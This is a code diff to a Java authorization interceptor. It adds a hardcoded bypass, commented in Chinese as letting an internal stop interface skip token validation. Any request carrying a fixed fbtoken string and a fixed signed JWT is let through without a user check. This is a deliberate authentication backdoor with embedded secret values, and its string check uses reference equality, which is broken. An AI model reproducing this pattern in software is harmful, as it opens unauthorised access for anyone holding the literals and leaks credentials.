@@ -77,6 +77,11 @@ public class AuthorizationInterceptor extends HandlerInterceptorAdapter {
         String token = request.getHeader("token");
         UserInfo user = oauthService.getMe(fbtoken);
 
+        //内部访问停止接口，绕过token验证
+        if (fbtoken == "mIOHt38z2kZCMlRqIOLY6g==" && token == "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJzdWIiOiI0IiwiaWF0IjoxNjY3Mzg2NTI4LCJleHAiOjE2Njc5OTEzMjh9.81eoWYT1g1ov6XsQBxBOf9COh6EGEKo6ziv5YxK4-kNMYE79MuTnSOWoFN0XejVTG3b9Ml5isnWf3fEhbXCwIw") {
+            return true;
+        }
+
         if(null==user)
         {
             throw new AuthorizationException("Fbtoken失效，请重新登录");
